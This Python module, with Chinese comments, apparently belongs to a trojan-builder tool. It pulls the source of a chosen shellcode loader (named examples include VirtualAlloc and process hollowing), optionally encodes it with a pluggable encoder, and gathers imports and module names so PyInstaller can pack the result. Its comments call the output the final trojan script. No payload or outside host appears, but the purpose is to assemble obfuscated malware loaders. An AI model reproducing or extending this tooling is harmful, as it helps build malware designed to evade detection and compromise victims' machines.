import importlib
import inspect
import os
import sys
sys.path.append(os.path.abspath(os.path.dirname(__file__))+'/shellcodeLoader')
import re


def getcmd(shellcodeloader='VirtualAlloc1',encType=''):
    #获取shellcodeLoader目录下的shellcode加载器代码，只会获取所有自定义方法，从main方法开始执行（因此你自己编写的shellcode加载器可以自定义多个方法但必须从main方法中开始调用其他方法）
    md=importlib.import_module(f'shellcodeLoader.{shellcodeloader}'.replace('.py',''))
    cmd=''
    fun=dir(md)
    # print(inspect.getsource(md))
    cmd_=inspect.getsource(md).split('\n')
    stop=0
    for line in cmd_:
        if re.search(r"__main__",line):
            stop=1
        elif stop==1 and re.match('\w\W',line):
            stop=0


        if stop==0 and line:
            cmd+=line+'\n'

    # for f in fun:
    #     if inspect.isfunction(eval(f'md.{f}')):
    #         cmd+=inspect.getsource(eval(f'md.{f}'))+'\n'
    #     elif inspect.isclass(eval(f'md.{f}')):
    #         try:
    #             cmd+=inspect.getsource(eval(f'md.{f}'))
    #         except:
    #             pass
    #     else:
    #         if inspect.istraceback(eval(f'md.{f}')):
    #             print(f)
    #判断是否使用了加解密器，如果有指定加解密器，那么shellcode加载器的代码也会被该加解密器的Encode方法加密，运行时再通过该加解密器的Decode方法解密还原。
    EncCmd=''
    if encType:
        EncCmd=importlib.import_module(f'Encoder.{encType}'.replace('.py','')).Encode(cmd.encode())

    print(f'原始CMD：\n{cmd}\n'+'-'*80)
    return EncCmd if EncCmd else cmd


def getDecodecmd(encType=''):
    #如果指定了加解密器，那么会获取该加解密器的Decode方法的源代码，用于写入最终的木马脚本中（这样才能解密）
    EncCmd=''
    if encType:
        EncCmd=inspect.getsource(importlib.import_module(f'Encoder.{encType}'.replace('.py','')).Decode)

    return EncCmd if EncCmd else ''


def getImport(shellcodeloader='VirtualAlloc1',encType=''):
    #获取所有需要import的包，最终生成的木马脚本中需要import的内容
    file=f'shellcodeLoader/{shellcodeloader}'.replace('.py','')+'.py'
    s=set()
    result=''
    #1.添加上base64、random、time，这3个是后期处理时使用过的包
    other=['import base64','import sys','import random','import os','import time']
    for line in other:
        result+=line.strip()+'\n'
        s.add(line.strip())

    #2.从shellcode加载器中获取需要import的包
    with open(file,'r',encoding='utf-8') as f:
        for line in f:
            if re.search(r'^import|^from[\w\W]*import',line):
                if line.strip() in s:
                    continue
                result+=line.strip()+'\n'
                s.add(line.strip())
    #3.如果有指定加解密器，从Encoder目录下的加解密器中获取需要import的包
    if encType:
        file=f'Encoder/{encType}.py'
        with open(file,'r',encoding='utf-8') as f:
            for line in f:
                if re.search(r'^import|^from[\w\W]*import',line.strip()):
                    if line.strip() in s:
                        continue
                    result+=line.strip()+'\n'
                    s.add(line.strip())


    return result

def getModulName(shellcodeloader='VirtualAlloc1',encType=''):
    #获取所有需要import的包的名字，用于自动pyinstaller打包时指定--import-module
    s=set()
    #1.从shellcode加载器中获取
    md=importlib.import_module(f'shellcodeLoader.{shellcodeloader}'.replace('.py',''))
    fun=dir(md)
    # print(fun)
    for f in fun:
        if inspect.ismodule(eval(f'md.{f}')):
            s.add(f)
    #2.如果有使用加解密器，从加解密器中获取
    if encType:
        md=importlib.import_module(f'Encoder.{encType}'.replace('.py',''))
        fun=dir(md)
        print(fun)
        for f in fun:
            if inspect.ismodule(eval(f'md.{f}')):
                s.add(f)
    return s

if __name__ == '__main__':
    # a=getcmd('process-hollowing-test')
    a=getcmd('VirtualAlloc1.py','base64Enc')
    print(a)
    #


    # imp=getImport('VirtualAlloc1','base64Enc')
    # print(imp)

    # mod=getModulName('test','base64Enc')
    # print(mod)